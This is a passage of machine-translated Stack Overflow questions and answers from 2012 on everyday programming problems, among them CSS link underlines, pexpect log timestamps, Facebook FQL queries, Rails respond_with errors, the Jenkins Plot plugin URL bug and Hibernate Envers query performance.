这是最小（非）工作示例：

```
 <html>
    <head>
    <style>
            a div.menuitem {
              text-decoration: none;
              color: red;
            }
            .remove-under {
              text-decoration: none;
            }
    </style>

    </head>
    <body>
            <a href="./index.html">
                    <div class="menuitem">Link1</div>
            </a>
            <a href="./index.html" class="remove-under">
                    <div class="menuitem">Link2</div>
            </a>
    </body>
    </html> 
```

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:36:29.183

从语义上讲 a`<div>`不应该进入 a `<a>`。div 标签是块元素，其中锚标签是内联元素 - 块元素永远不应进入内联元素。`<span>`如果您需要对不同的内联内容进行样式化，请改为使用，但在您的情况下，另外，您可以将一个类添加到`<a>`效果更好的类中。

这是您的新代码：

```
<a href="./index.html" class="menuitem">
    Link1
</a>
<a href="./index.html" class="remove-under menuitem">
    Link2
</a> 
```

您可以通过放置一个空格来为一个元素设置多个类，因此 Link2 具有“remove-under”和“menuitem”类

更新您的 CSS 以删除下划线：

```
.remove-under {
    text-decoration:none;
} 
```

为了让你的整个 a 标签成为一个链接（不仅仅是文本），为你的 menuitem 类添加以下 css：

```
.menuitem {
    display:block;
    width: 100px; 
    height: 50px; /* or whatever your desired width and height */
    background: red; /* to show that the whole anchor will be link, not just text */
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:37:56.587

这不是理想的解决方案。您真的不应该将块级元素放入内联元素中。

但是，如果您绝对必须让它工作，您可以添加`display: inline-block;`到 div。

```
a div.menuitem {
    text-decoration: none;
    color: red;
    display: inline-block;
    width:100%;
}
.remove-under {
    text-decoration: none;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:32:15.440

你在这里有两个问题：

1.  你不能做这样的事情

    ```
    <a href="#"><div></div></a> 
    ```

    因为 a 是一个内联元素。您在这里所做的是无效的 HTML 代码。像这样做：

    ```
    <div><a href="#"></a></div> 
    ```

2.  您尝试在 div 元素上应用 text-decoration:none ，并且应该将其应用于 a 元素。

    ```
    a {text-decoration:none;} 
    ```

# sql-server - SQL 登录通知

> ID：13271685
> 
> 赞同：0
> 
> 时间：2012-11-07T14:24:35.530
> 
> 标签：sql-server, sql-server-2008

我希望收到有关`Application Name`连接字符串属性具有特定值的 SQL Server 登录的通知。有人可以帮助我通过电子邮件或任何其他推荐的方法获取这些类型的通知吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:05:13.763

您正在寻找[登录触发器](http://msdn.microsoft.com/en-us/library/bb326598.aspx)。在触发器中，您可以检查连接应用程序名称（请注意，此设置不安全，很容易被欺骗）。用于[`sp_send_dbmail`](http://msdn.microsoft.com/en-us/library/ms190307.aspx)给自己发送邮件。

# python - 如何在 pexpect 的日志文件中获取时间戳

> ID：13271686
> 
> 赞同：2
> 
> 时间：2012-11-07T14:24:36.343
> 
> 标签：python, python-2.7, pexpect

我正在使用**pexpect**来处理我的 telnet 和 ssh 通信。我还在**日志文件**中写入所有请求/响应。使用`pexpect.logfile(filename)`.

我也想在日志文件中有**时间戳**。我在文档中的任何地方都找不到它！有谁知道如何实现这个功能？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-09T10:16:07.387

`logfile`可以是任何具有`write()`,`flush()`方法的对象：

```
from datetime import datetime

class TimestampedFile(object):
    def __init__(self, file):
        self.file = file

    def write(self, data):
        # .. filter data however you like
        ts = datetime.utcnow().isoformat()  # generate timestamp
        return self.file.write("%s %s\n" % (ts, data))  # write to original file

    def flush(self):
        self.file.flush() 
```

### 例子

```
with open(filename, 'w') as file:
    pexpect.run('echo "hello world!"', logfile=TimestampedFile(file)) 
```

[您的日志记录示例](https://stackoverflow.com/a/13289161/4279)可以简化：

```
class FileAdapter(object):
    def __init__(self, logger):
        self.logger = logger
    def write(self, data):
        # NOTE: data can be a partial line, multiple lines
        data = data.strip() # ignore leading/trailing whitespace
        if data: # non-blank
           self.logger.info(data)
    def flush(self):
        pass  # leave it to logging to flush properly 
```

### 例子

```
# setup logging to include a timestamp
logging.basicConfig(format="%(asctime)s %(message)s", level=logging.INFO)
# ... run command sometime later
pexpect.run('echo "hello world!"', logfile=FileAdapter(logging.getLogger('foo'))) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T12:29:20.593

经过一番搜索，我发现下面的代码对我有用！看看下面的代码：

```
import logging
import pexpect
import re

# this is the method called by the pexpect object to log
def _write(*args, **kwargs):
    content = args[0]
    # Ignore other params, pexpect only use one arg
    if content in [' ', '', '\n', '\r', '\r\n']:
        return # don't log empty lines
    for eol in ['\r\n', '\r', '\n']:
        # remove ending EOL, the logger will add it anyway
        content = re.sub('\%s$' % eol, '', content)
    return logger.info(content) # call the logger info method with the reworked content

# our flush method
def _doNothing():
    pass

logger = logging.getLogger('foo')
hdlr = logging.FileHandler('/bar.log')
formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
hdlr.setFormatter(formatter)
logger.addHandler(hdlr)
logger.setLevel(logging.INFO)

# give the logger the methods required by pexpect
logger.write = _write
logger.flush = _doNothing

p = pexpect.spawn('echo "hello world !"', logfile=logger) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T19:24:41.177

如果您查看[pexpect.py](http://pexpect.svn.sourceforge.net/viewvc/pexpect/trunk/pexpect/pexpect.py?revision=533&view=markup)源文件，您会发现记录日志的方法只是将发送/接收到子进程的内容写入流（可以是文件，例如，`sys.stdout`如果您更喜欢登录到控制台）。因此，如果不更改源，您所要求的是不可能的`pexpect`，例如，能够使用标准库[日志记录](http://docs.python.org/2/library/logging.html)模块 logger 进行输出（提示：也许是为项目做出改进的好机会？）。

# facebook - facebook 批处理/fql 好友列表一个朋友是其中的成员

> ID：13271688
> 
> 赞同：1
> 
> 时间：2012-11-07T14:24:40.923
> 
> 标签：facebook, facebook-javascript-sdk, facebook-fql, facebook-batch-request

我正在创建一个 javascript facebook 应用程序来概述我的好友列表。实际上，我可以检索我的（登录用户 = 我）好友列表，当我单击好友列表时，我会在该列表中看到我的所有好友。

现在我想要的是，当我单击一个列表时，我想查看属于该列表的朋友，并且我的朋友所属的列表以逗号分隔。

例如，在**“最佳”**列表中，我有 3 个朋友：**Athos、Portos、Aramis**。但它们也在其他列表中。所以在我的应用程序中，我想得到这样的东西：

*   **Athos** : 最好的, 家庭, 亲密的朋友, VIP
*   **波尔图斯**：最佳，VIP
*   **阿拉米斯**：最好的，亲密的朋友，派对动物

我尝试使用 FQL 多查询，但似乎不可能得到我想要的。

所以我认为我应该使用批处理请求，但是由于我在这里没有很多使用批处理的经验，所以我请求您的帮助。

所以这里是我用来获取属于列表的朋友的 FQL 查询。我需要这个，因为我想从列表开始管理朋友：

```
var listID = 123;//just enter a listID
var friendsInList = 'SELECT uid,username,profile_url,first_name,last_name,pic_square FROM user WHERE uid IN (SELECT uid FROM friendlist_member WHERE flid =' + listID +')'; 
```

现在我不知道如何以干净有效的方式进行。我有一个有效但效率低下的解决方案：

```
//[...]FB.api call to get a response object with all my friends using the friendsInList query above
for (var i = 0; i < response.length; i++) {
    friendID = response[i].uid;
    //call FB.api with the following query:
    var friendListMemberships = 'SELECT uid, flid, name FROM friendlist_member WHERE flid IN (SELECT flid FROM friendlist WHERE owner=me()) AND uid IN (select uid FROM friendlist WHERE flid =' + friendID;
} 
```

上面的解决方案有效，但效率很低，因为我为每个朋友发送一个 FB.api 请求，对于大列表来说非常慢......因此我希望专业用户帮助我将它放在一个[批次](https://developers.facebook.com/docs/reference/ads-api/batch-requests/)中（一个批次最多可以有50 个请求，因此我只想发送 1-2 个请求并取回我需要的所有内容）。

我知道如何写一个批处理，这里我把我的代码结构，如果它可以帮助你完成第二个查询：

```
var listID = _listID;

var _queryFriendsInList = 'SELECT uid,username,profile_url,first_name,last_name,pic_square FROM user WHERE uid IN (SELECT uid FROM friendlist_member WHERE flid =' + listID + ')';

var queryFriendsInList = _queryFriendsInList.replace(" ", "+");

var _queryFriendListMemberships = 'I have no idea what kind of query I can write here to get the lists my friends from queryFriendsInList are member of';

var queryFriendListMemberships = _queryFriendListMemberships.replace(" ", "+");

var searchArgs = {
    access_token: FB.getAuthResponse().access_token,
    batch: []
};

searchArgs.batch.push({
    'method': 'GET',
    'name': 'friendsInList',
    'relative_url': 'method/fql.query?query=' + queryFriendsInList,
    'omit_response_on_success': false
});

//here is where I need help
searchArgs.batch.push({
    'method': 'GET',
    'name': 'friendlistMememberships',
    'relative_url': 'method/fql.query?query=' + queryFriendListMemberships,
    'omit_response_on_success': false
});

FB.api("/", "POST", searchArgs,
function (response) {
    //console.log("log");
}
); 
```

我希望问题和代码示例足够清楚。谢谢你的帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:11:58.683

您可以在一次 API 调用中通过多重查询获得所需的一切。您需要在客户端通过几个循环将其组装在一起，但这应该不会太难。这是查询：

```
{
"all_friendlists":
    "SELECT flid, owner, name FROM friendlist WHERE owner=me()",
"fl_members":
   "SELECT uid, flid FROM friendlist_member WHERE flid IN 
      (SELECT flid FROM #all_friendlists)",
"fl_member_details":
   "SELECT uid, name, username FROM user WHERE uid IN (SELECT uid FROM #fl_members)" 
} 
```

您可以通过这个 API 调用向您的用户展示所有内容。该`#all_friendlists`查询提供了所有用户的好友列表。一旦您的用户选择了一个好友列表，然后循环`#fl_members`查找该列表的所有成员，从 中检索他们的详细信息`#fl_member_details`。进行另一个循环`#fl_members`以查找它们所属的其他列表。

或者，您可以将这三个列表混合到一个演示页面中，并使用[Isotope](http://isotope.metafizzy.co/index.html)等 jQuery 数据过滤方案来允许您的用户进行排序/过滤/等。在飞行中。

# c# - WPF 组合框 ItemTemplate 不适用

> ID：13271689
> 
> 赞同：0
> 
> 时间：2012-11-07T14:24:43.543
> 
> 标签：c#, wpf, xaml, data-binding

我有一个组合框，它绑定到一个字典

```
<int, MyObject> 
```

通过以下代码：

```
this.comboBox.ItemsSource= dictionary; 
```

MyObject 有一些公共属性，例如 Name（字符串）和 Selected（布尔值）。

在我的 Xaml 中，我在组合框上有一个 ItemTemplate：

```
<ComboBox.ItemTemplate>
    <DataTemplate>
        <TextBlock Text="{Binding Path=Key, Mode=OneWay}"/>
    </DataTemplate>
</ComboBox.ItemTemplate> 
```

当我运行应用程序时，我得到了填充有 [1, MyObject] 值的组合框。

我最终想要做的是在 ItemTemplate 中有一个复选框和一个文本块，它们将绑定到 MyObject.Selected 和 MyObject.Name。目前，我什至无法让数据模板显示字典键值。

任何想法为什么 itemtemplate 被忽略？我尝试了完整的模板（包含组合框和文本块的堆栈平面），它在运行时显示相同的值。

干杯。

# ruby - 为什么 response_with JSON 不起作用？

> ID：13271690
> 
> 赞同：3
> 
> 时间：2012-11-07T14:24:43.863
> 
> 标签：ruby, ruby-on-rails-3, rest

尝试在 Rails 控制器中使用返回时遇到问题。这不起作用：

```
class UsersController < ApplicationController
respond_to :json

    def create
        @user = User.create params[:user_info] 
        respond_with @user
    end
end 
```

这有效：

```
class UsersController < ApplicationController
respond_to :json

    def create 
        @user = User.create params[:user_info] 
        respond_with @user do |format|
              format.json { render json: @user.to_json }
        end
    end
end 
```

为什么？这是我在使用不起作用的日志时在服务器日志中遇到的错误：

```
NoMethodError (undefined method `user_url' for #<UsersController:0x007fd44d83ea90>):
app/controllers/users_controller.rb:7:in `create' 
```

我的路线是：

```
resources :users, :only => [:create] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T15:11:18.253

`responds_with`尝试重定向到`user_url`，因此它会`show`在您的用户控制器中查找您没有的方法，因为您的路线仅限于该`create`方法。由于 create 方法默认重定向到 show 方法，这不起作用。但是在您的第二个版本中，您实际上是在渲染某些东西，因此不会发生重定向。

如果这是您想要的，您可以`:location`选择，如下所示：`respond_with`

```
respond_with(@user, :location => home_url) 
```

或者像在第二个版本中一样使用渲染版本。

# javascript - 无法访问与 Masterpage 具有相同代码的独立 .aspx 页面中的所有功能，而无需对其进行分配

> ID：13271693
> 
> 赞同：1
> 
> 时间：2012-11-07T14:24:53.503
> 
> 标签：javascript, asp.net, webforms, dom-events, master-pages

我为网站制作了一个单独的 .aspx 页面（未分配给母版页）。在菜单栏上，我为这些超链接创建了 10 个超链接，另外 4 个（子）超链接和用`Function:menuover`Javascript 制作的高度轻（子）超链接，我想在鼠标悬停时显示这些（子）超链接。

该功能在每一页都有显示；但在那个单独的 .aspx 页面上，它仅显示 4 个（子）超链接中的 3 个。我为那个单独的 .aspx 页面复制了相同`Function:menuover`的 Masterpage 代码。

那么，任何人都可以帮助我访问单独的 .aspx 页面的相同代码吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T15:13:38.063

您应该创建一个用户控件 (.ascx) 文件并将代码移到那里。

然后在 .ascx.cs 文件中添加一个属性：

```
public bool ShowABCLink { get; set; }

protected override void OnPreRender(EventArgs e)
{
    if (!this.ShowABCLink) this.ABCLink.Visible = false;
} 
```

现在在您的 .aspx 页面中包含用户控件（在设计中使用拖放操作来自动处理 uc1 前缀注册等）：

```
<uc1:Navigation runat="server" ShowABCLink="true" /> 
```

在另一页上指定`false`. 还有其他非常相似的方法可以做到这一点，但这对你来说应该是最简单的。

# html - 在其他 iframe 中的元素上使用 accesskey 在 Chrome 中不起作用

> ID：13271694
> 
> 赞同：3
> 
> 时间：2012-11-07T14:24:54.370
> 
> 标签：html, google-chrome, iframe, accessibility, access-keys

在 chrome 中，我专注于“A”iframe。其他 iframe 上有元素设置 accesskey 属性。我不能使用 accesskey 来关注元素。IE、FF 不存在此问题。

有什么技巧可以解决这个问题吗？我的代码如下：

**索引.html：**

```
<!doctype html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Index</title>
</head>
<body>
    <input type="text"  accesskey="b" name="some_name" value="">
    <iframe src="a.html"></iframe>
    <iframe src="b.html"></iframe>
</body> 
```

**一个.html：**

```
<!doctype html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Index</title>
</head>
<body>
    <input type="text"  accesskey="e" name="some_name" value="">
</body> 
```

**b.html：**

```
<!doctype html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Index</title>
</head>
<body>
    <input type="text"  accesskey="t" name="some_name" value="">
</body> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-06-24T08:24:56.670

问题将与当前关注的背景有关。因此，如果用户没有在相应的 iframe 内单击，则访问密钥将不起作用。实现这一点的一种方法是触发 javascript keyevent，它将键事件转发到每个 iframe，直到它满足相应的访问键属性。

# vb.net - 帕斯卡三角 - VB.NET

> ID：13271701
> 
> 赞同：-2
> 
> 时间：2012-11-07T14:25:13.747
> 
> 标签：vb.net

我已经创建了一个程序，它将显示 x 行并重复：

IE

```
1
2 2
3 3 3 
4 4 4 4 
5 5 5 5 5
6 6 6 6 6 6 
```

现在我想做帕斯卡三角形

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:32:39.167

也许是这样的：

```
Dim arr As Integer(,) = New Integer(7, 7) {}
 For i As Integer = 0 To 7
    For k As Integer = 7 To i + 1 Step -1
        'print spaces
        Console.Write(" ")
    Next

    For j As Integer = 0 To i - 1
        If j = 0 OrElse i = j Then
            arr(i, j) = 1
        Else
            arr(i, j) = arr(i - 1, j) + arr(i - 1, j - 1)
        End If
        Console.Write(arr(i, j) & " ")
    Next
    Console.WriteLine()
Next 
```

控制台输出：

![在此处输入图像描述](../Images/c3edafdb32419240ee5cc05d878269f3.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T16:43:41.907

另一种方法，仅将先前和当前的迭代保留在内存中：

```
Dim oldList As New List(Of Integer)({0, 1})
For line = 1 To 7
  Dim newList As New List(Of Integer)
  For i = 1 To oldList.Count - 1
    newList.Add(oldList(i - 1) + oldList(i))
  Next
  Debug.Print(String.Join(" ", newList))
  oldList.Clear()
  oldList.Add(0)
  oldList.AddRange(newList)
  oldList.Add(0)
Next 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-30T08:02:04.440

要使用 Windows 窗体执行此操作，您需要一个文本框、多行文本框和设计界面上的一个按钮

这是您生成它所需的代码

```
Imports System.Numerics 'this allows you to  use big integer

Public Class pascal_triangle

    Private Function factorial(ByVal k As Integer) As BigInteger

'big integer allows your proram compute for inputs of more than 22

        If k = 0 Or k = 1 Then

            Return 1

        Else

            Return k * factorial(k - 1)

        End If

    End Function

    Private Sub BtnGen_Click(sender As Object, e As EventArgs) Handles BtnGen.Click
        Dim nCr As Double

        Dim i, j, k As Integer

        Dim output As String

        output = ""

        j = Val(TxtColumn.Text)

        For k = 0 To j

            For i = 0 To k

                Dim fact, fact1, fact2 As BigInteger

                fact = factorial(k)

                fact1 = factorial(k - i)

                fact2 = factorial(i)

                nCr = fact / (fact1 * fact2)

                TxtOutput.Text += Str(nCr) & output

            Next

            TxtOutput.Text += vbCrLf

        Next

    End Sub

    Private Sub pascal_triangle_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class 
```

# c# - 页面处理后向用户显示信息

> ID：13271705
> 
> 赞同：0
> 
> 时间：2012-11-07T14:25:34.063
> 
> 标签：c#, asp.net, post, controls

我（非常）是 ASP.NET 的新手，并且正在构建一个注册表单。我建立了一个空网站，添加`Register.aspx`并填充了通常在注册页面上显示的所有表单元素。我还将表单提交到 Register.aspx 页面。

现在，我想在提交后捕获 POST 数据。我看到`Page_Load`Register.aspx.cs 中有一个方法，在其中我已经完成了：

```
if (Request.HttpMethod == "POST")
{
    // Validate inputs and show information to the user
} 
```

但是现在我不知道如何将内容打印到页面上。经过一番挖掘，我尝试使用 Label 控件，所以我把它放在我的 Register.aspx 页面上：

```
<asp:Label ID="StatusLabel" runat="server" Text=""></asp:Label> 
```

但是当我尝试`StatusLabel.Text`从 Register.aspx.cs 中访问它时，我收到一条错误消息，指出它在当前上下文中不存在。

我很困惑，我怎样才能实现我想做的事情？

干杯!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:31:18.447

你需要确保你的声明

```
<asp:Label ID="StatusLabel" runat="server" Text=""></asp:Label> 
```

在页面内容内，即在

```
<asp:Content></asp:Content> 
```

标签

# c++ - 使用 log4cplus 运行代码时出现 bad_alloc 错误

> ID：13271707
> 
> 赞同：2
> 
> 时间：2012-11-07T14:25:41.690
> 
> 标签：c++, windows, runtime-error, log4cplus

我一直在尝试在我的 PC 上运行这个 log4cplus 示例：

[http://log4cplus.sourceforge.net/loglevel.html](http://log4cplus.sourceforge.net/loglevel.html)

我已经使用 VS2010 创建了我的 LogLevel 项目，并且正在使用 log4cplus v1.1.0。

我的程序编译得很好，但是当我踏上这条线时

```
Logger logger = Logger::getInstance(LOG4CPLUS_TEXT("main")); 
```

我收到以下错误：

```
Unhandled exception at 0x75d5d3cf in LogLevel.exe: Microsoft C++ exception: std::bad_alloc at memory location 0x0030ed2c.. 
```

在“..\Microsoft Visual Studio 10.0\VC\crt\src\new.cpp”文件中（第 63 行）

我怎样才能解决这个问题？

我知道还有[另一个 SO 线程](https://stackoverflow.com/questions/12230326/loggergetinstance-causing-bad-alloc-exception-in-log4cplus)在谈论同样的问题，但不幸的是它没有解决。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-11T15:40:21.777

如果您在调试中构建应用程序，请务必链接到 lib4CplusD.lib 和 lib4CplusD.dll。同样，发布应用程序应该链接 aginst lib4cplus.lib 和 lib4cplus.dll 我有相同的运行时错误，当我将调试应用程序与调试库链接时，问题得到了解决。

[Logger::getInstance 在 log4cplus 中导致 bad_alloc 异常](https://stackoverflow.com/questions/12230326/loggergetinstance-causing-bad-alloc-exception-in-log4cplus)

# java - Jenkins/Hudson Plot 插件 URL 构造不正确

> ID：13271710
> 
> 赞同：3
> 
> 时间：2012-11-07T14:25:43.263
> 
> 标签：java, plugins, plot, jenkins, hudson

我面临以下问题：我正在使用 Jenkins/Hudson 的 Plot 插件来根据每个构建显示一些字符，并且这项工作很好......但是我想显示更多关于点击的数据，其中Plot 插件应该支持。

我正在使用“使用 xpath 从 xml 文件加载数据”选项、Nodeset 和 URL：

```
http://host:8080/abc/%name%/%index%/def 
```

帮助弹出窗口指出以下内容：

> 可选的。如果设置，则在您单击某个点时使用此 url。这用作每个点的基本 url，%name% 和 %index% 将在 url 中替换为列名和索引。

但是，当我单击生成图中的点时，%name% 和 %index% 不会被索引替换，所以 URL 当然不是我所期望的......

任何想法如何将索引正确放置在占位符中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-28T15:56:42.027

这现在在 Plot Plugin 1.8 版中得到修复。

这是更正后的代码：

```
private String getUrl(String label, int index)
{
    // code below was updating this.url, which is the original url provided
    // by the user
    String url = this.url;

    Matcher nameMatcher = PAT_NAME.matcher(url);
    if (nameMatcher.find())
    {
        // replace with label if "%name%" pattern was found
        url = nameMatcher.replaceAll(label);
    }
    Matcher indexMatcher = PAT_INDEX.matcher(url);
    if (indexMatcher.find())
    {
        // replace with index if "%index%" pattern was found
        url = indexMatcher.replaceAll(String.valueOf(index));
    }
    return url;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-31T17:22:00.013

我不相信这在当前存在的插件中有效。[Github 上](https://github.com/jenkinsci/plot-plugin/blob/master/src/main/java/hudson/plugins/plot/CSVSeries.java#L335)用于模式替换的代码是（对于 CSV 文件）：

```
/**
 * Return the url that should be used for this point.
 * @param label Name of the column
 * @param index Index of the column
 * @return url for the label.
 */
private String getUrl(String label,int index)
{
    /*
     * Check the name first, and do replacement upon it.
     */
    Matcher nameMatcher = PAT_NAME.matcher(label);
    if (nameMatcher.find())
    {
        url = nameMatcher.replaceAll(label);
    }

    /*
     * Check the index, and do replacement on it.
     */
    Matcher indexMatcher = PAT_INDEX.matcher(label);
    if (indexMatcher.find())
    {
        url = indexMatcher.replaceAll(label);
    }

    return url;
} 
```

`label`是 CSV 列标题，因此此代码尝试将列标题中的`%name%`和替换`%index%`为列标题本身。

我创建了一个[拉取请求](https://github.com/jenkinsci/plot-plugin/pull/8)来解决这个问题。

# jquery - jQuery验证值规则

> ID：13271713
> 
> 赞同：2
> 
> 时间：2012-11-07T14:26:01.520
> 
> 标签：jquery, jquery-validate

我正在尝试验证一个输入。所以我想得到这种规则 - 如果字段值等于“xxx”（文本），那么字段是有效的。

我试过这个，但它似乎只有当你希望两个输入相同时才有效。

```
$("#contact-form").validate({
    rules: {
        capcode: {
            equalTo: "xxx"
        }
    }
});​ 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T14:31:29.850

不确定您要实现什么，但您始终可以添加自定义验证方法：

```
$.validator.addMethod("customValidation", function(value, element) {
    return value == 'xxx'
}, "Value must be 'xxx'.");​ 
```

然后简单地在你的领域使用它：

```
$("#contact-form").validate({
    rules: {
        capcode: {
            customValidation: true
        }
    }
});​ 
```

请参阅此[演示](http://jsfiddle.net/7jPZx/)。

# reporting-services - 如何对 Dynamics CRM 中的字段求和？

> ID：13271718
> 
> 赞同：3
> 
> 时间：2012-11-07T14:26:22.707
> 
> 标签：reporting-services, sum, dynamics-crm, dynamics-crm-2011, crm

这似乎应该是有史以来最简单、交钥匙、开箱即用的一年级任务。但可惜，事实并非如此。

我想要做的就是在 CRM 中将货币字段中的所有返回值添加到一起并粘贴到报告中。那是过分的要求？但是，我没有采用一些简单的方法来进行第一次无脑活动，而是陷入了困境。

如何在 CRM 报告中创建一个计算字段，其结果是来自实体中单个字段的值的简单总和？为了清楚起见，另一种说法是：如果我有任何可用的实体，并且从 DataSet 中返回的所有适用过滤的记录只选择了一个货币字段，我如何 Sum() 所有这些返回值并显示在报告中？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T19:50:34.607

无法从 CRM 的报告向导或视图编辑器中完成所需的字段总和。正如 Peter 开始指出的那样，如果您使用 CRM 获取数据源，您肯定会注意到 oyur 查询中的货币字段如何最终成为 SSRS 数据集中的 2 个字段：一个带有字段名称，一个带有“值”后缀，包含货币字段的数值。我相信你已经发现了这一点。

Salesforce 用户可以直接使用“公式字段”在表单上完成此操作，但不完全确定 Salesforce 是如何完成报告的。

我完全同意在视图中计算字段是 Dynamics CRM 有很大差距的一个简单而强大的功能。[这个功能差距在microsoft connect](https://connect.microsoft.com/dynamicssuggestions/feedback/details/675226/improve-fetchxml-query-expressions-and-linq-support-more-sql-please)上只有 51 票，所以检查一下并给它一个赞成票。

# html - 是否可以在没有 RTP/SAVP 的情况下使用 SIPML5

> ID：13271721
> 
> 赞同：1
> 
> 时间：2012-11-07T14:26:30.080
> 
> 标签：html, webrtc

我想知道你们中是否有人了解开源 html5 sip 客户端，它称为 SIPML5。

我似乎无法弄清楚如何在不使用 RTP/SAVPF 的情况下开始工作。

所以我的问题是是否可以使用 RTP/SAVP 而不是 RTP/SAVPF？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T17:20:57.573

说谎。在传入 SDP 之前，只需将所有 RTP/SAVP 实例替换为 RTP/SAVPF。它应该工作得很好。

RTP/SAVPF 和 RTP/SAVP 相当兼容。“F”表示 RTP 配置文件，其中 RTCP 反馈的时间更加宽松。由于大多数 RTP 端点不严格检查 RTCP 反馈时序，因此 RTP/SAVP 端点通常会与 RTP/SAVPF 端点互操作。

# jquery - 使用jquery将文本字符串转换为xml

> ID：13271727
> 
> 赞同：1
> 
> 时间：2012-11-07T14:27:05.853
> 
> 标签：jquery, xml, imagemapster

我正在使用[http://www.outsharked.com/imagemapster](http://www.outsharked.com/imagemapster)并且我想提取选定的区域并格式化为 xml，最好是提交。

下面的点击返回选定的区域并将文本放入一个跨度

```
$("#show_selected").bind("click", function (e) {
            e.preventDefault();
            $('#selections').text($("#body_map").mapster("get"));
        }); 
```

上面的html...

```
<div>
    <a id="show_selected" href="#">Click here to show selected items:</a>
    <span id="selections"></span>
    </div> 
```

提前致谢。

# java - Hibernate Envers 中的查询性能

> ID：13271732
> 
> 赞同：2
> 
> 时间：2012-11-07T14:27:17.853
> 
> 标签：java, hibernate, hibernate-envers

我们目前在一个项目中使用 Envers，当我们查询一些分布在多个表中的审计数据时，性能会下降很多。

基本上，我们创建一个审计数据流，如下所示：

```
List<Object[]> auditStream = new LinkedList<Object[]>();
for (Class<?> entityClass : desiredEntityClasses) {
    auditStream.addAll(
        auditReader.createQuery()
            .forRevisionsOfEntity(entityClass, false, true)
            .add(AuditEntity
                .revisionProperty("timestamp")
                .ge(startTimestamp))
            .getResultList());    
} 
```

除此之外，某些类型的实体（如嵌套实体）需要一些额外的审计信息。

对于少量数据（通过减少时间戳）的响应时间是合理的，但是在 500 个条目中`auditStream`，大约需要 3 秒才能获得所有数据，这太长了。

**Q1**我想知道是否可以对这类查询启用批量获取以及如何启用？

**Q2**是否有某种方法可以优化查询，例如一次获取多种实体？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:53:54.680

一个 Audition 是多个表中更改的集合！

如果您使用 REVID 引用的修订表 (REVINFO)，则将检查所有其他表是否匹配此 REVID 的更改。

Q1：并非所有依赖表的更改都取决于您的 Entity-Audition，Batch-Fetch 不能在这里工作。

Q2：您最好直接通过 HQL 或纯 SQL 获取更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T08:57:04.603

为了有效地实现这一点，您需要有关在单个表中的修订中完成的所有更改的信息 - 现在您正在查询多个。

从 Envers 方面来看，也许这会有所帮助： [http](http://docs.jboss.org/hibernate/core/4.0/devguide/en-US/html/ch15.html#envers-tracking-modified-entities-revchanges) ://docs.jboss.org/hibernate/core/4.0/devguide/en-US/html/ch15.html#envers-tracking-modified-entities-revchanges 这样你可以获取在修订时更改的实体的名称，但我不确定您对流的要求是什么 - 您需要返回给最终用户。

否则，我认为您必须实现一些自定义修改/将必要的“流”数据存储在单独的实体中。

# iphone - 如何使用phonegap文件api从iphone中的相机胶卷中删除照片？

> ID：13271737
> 
> 赞同：0
> 
> 时间：2012-11-07T14:27:21.643
> 
> 标签：iphone, cordova, fileapi

实际上我可以从如下位置删除文件

```
/Users/manu/Library/Application Support/iPhone Simulator/6.0/Media/DCIM/100APPLE 
```

但图像在照片应用程序中仍然可见。这是从哪里来的？

如何使图片在设备中无处可用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:31:16.283

您无法删除应用程序沙盒之外的文件。因此，您无法从设备中删除照片。

# objective-c - 通过 Flurry Analytics 跟踪崩溃

> ID：13271740
> 
> 赞同：0
> 
> 时间：2012-11-07T14:27:24.327
> 
> 标签：objective-c, ios, xcode, error-handling, flurry

我正在使用 Flurry 分析，我注意到 1 或 2 个人遇到了崩溃，我真的很想为他们修复它，但是这很烦人，因为他们没有联系告诉我崩溃的情况，所以我没有甚至不知道要调查哪个 viewController。

我正在使用以下异常处理程序来处理混乱：

```
void uncaughtExceptionHandler(NSException *exception) {
    NSArray *backtrace = [exception callStackSymbols];
    NSString *platform = [[UIDevice currentDevice] model];
    NSString *version = [[UIDevice currentDevice] systemVersion];
    NSString *message = [NSString stringWithFormat:@"Device: %@. OS: %@. Backtrace:\n%@",
                         platform,
                         version,
                         backtrace];

    [Flurry logError:@"Uncaught" message:message exception:exception];
} 
```

但是回溯被截断，我得到的是：

> NSRangeException：*** -[__NSArrayM objectAtIndex:]：索引 2 超出范围 [0 .. 1] 消息：设备：iPad。操作系统：5.1.1。回溯：（0 CoreFoundation 0x32b5e8a7 __exceptionPreprocess + 186 1 libobjc.A.dylib 0x34b03259 objc_exception_throw + 32 2 CoreFoundation 0x32aa79db -[__NSA

这对我没有帮助。

我可以使用其他方法来跟踪和报告错误吗？或者至少可以在崩溃时在屏幕上显示一条消息，以便我可以添加一条消息以请与我们联系？

